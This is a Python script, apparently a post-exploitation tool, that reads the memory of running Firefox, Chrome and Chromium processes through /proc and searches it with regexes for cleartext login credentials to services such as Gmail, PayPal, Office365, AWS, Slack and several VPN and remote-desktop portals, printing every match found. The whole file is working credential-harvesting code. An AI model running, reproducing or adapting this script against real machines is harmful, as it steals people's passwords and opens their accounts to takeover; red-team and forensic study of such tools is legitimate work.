#!/usr/bin/env python

import re, sys, os
from subprocess import check_output
"""
Searches memory of Firefox, Chrome and Chromium for cleartext passwords
"""

patterns = {
    'AnubisLabs': 'username=.{1,42}&password=.{1,22}&login=login',
    'BugZilla': 'Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}',
    'CitrixNetScaler': 'login=.{1,22}&passwd=.{1,42}',
    'CitrixOnline': 'emailAddress=.{1,50}&password=.{1,50}&submit',
    'Cpanel': 'user=.{1,50}&pass=.{1,50}',
    'Dropbox': 'login_email=.{1,99}&login_password=.{1,99}&',
    'Facebook': 'lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=',
    'Github': '%3D%3D&login=.{1,50}&password=.{1,50}',
    'Gmail': '&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=',
    'JIRA': 'username=.{1,50}&password=.{1,50}&rememberMe',
    'JuniperSSLVPN': 'tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=',
    'LinkedIN': 'session_key=.{1,50}&session_password=.{1,50}&isJsEnabled',
    'MYOB': 'UserName=.{1,50}&Password=.{1,50}&RememberMe=',
    'Malwr': '&username=.{1,32}&password=.{1,22}&next=',
    'MicrosoftOneDrive': 'login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=',
    'Office365': 'login=.{1,32}&passwd=.{1,22}&PPSX=',
    'OutlookWeb': '&username=.{1,48}&password=.{1,48}&passwordText',
    'PayPal': 'login_email=.{1,48}&login_password=.{1,16}&submit=Log\\+In&browser_name',
    'RDPWeb': 'DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType',
    'Redmine': 'username=.{1,50}&password=.{1,50}&login=Login',
    'SalesForce': '&display=page&username=.{1,32}&pw=.{1,16}&Login=',
    'Slack': '&crumb=.{1,70}&email=.{1,50}&password=.{1,48}',
    'Twitter': 'username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=',
    'VirusTotal': 'password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json',
    'Xero ': 'fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=',
    'Zendesk': 'user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}',
    'awsWebServices': '&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1='
}

regexes = {}

for key in patterns:
    regexes[key] = re.compile(patterns[key])


def get_browser_pids():
    """
    get all the pids of a each browser
    """
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    browsers = {}
    for pid in pids:
        try:
            process = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
            pid = int(pid)
            if "chromium" in process.lower():
                if "chromium" not in browsers:
                    browsers["chromium"] = [pid]
                else:
                    browsers["chromium"].append(pid)
            elif "firefox" in process.lower():
                if "firefox" not in browsers:
                    browsers["firefox"] = [pid]
                else:
                    browsers["firefox"].append(pid)
            elif "chrome" in process.lower():
                if "chrome" not in browsers:
                    browsers["chrome"] = [pid]
                else:
                    browsers["chrome"].append(pid)
        except IOError:
            continue
    return browsers

def get_matches_of_pid(pid, only_writable=True):
    """ 
    Run as root, take an integer PID and return the matches of that pids memory
    """
    memory_permissions = 'rw' if only_writable else 'r-'
    print("PID = %d" % pid)
    mem_contents = ""
    with open("/proc/%d/maps" % pid, 'r') as maps_file:
        with open("/proc/%d/mem" % pid, 'r', 0) as mem_file:
            for line in maps_file.readlines():  # for each mapped region
                m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r][-w])', line)
                if m.group(3) == memory_permissions: 
                    start = int(m.group(1), 16)
                    if start > 0xFFFFFFFFFFFF:
                        continue
                    end = int(m.group(2), 16)
                    mem_file.seek(start)  # seek to region start
                    chunk = mem_file.read(end - start)  # read region contents
                    mem_contents += chunk 
                else:
                    pass
    matches = {}
    for service in regexes:
        match = regexes[service].findall(str(mem_contents))
        if match:
            matches[service] = match
    return matches

if __name__ == '__main__':
    browsers = get_browser_pids()
    for browser in browsers:
        print "Found %s running, scanning processes...." % browser
        for pid in browsers[browser]:
            matches = {}
            try:
                matches = get_matches_of_pid(pid)
            except IOError:
                continue
            for service in matches:
                print "Found service %s: %s" % (service, matches[service])
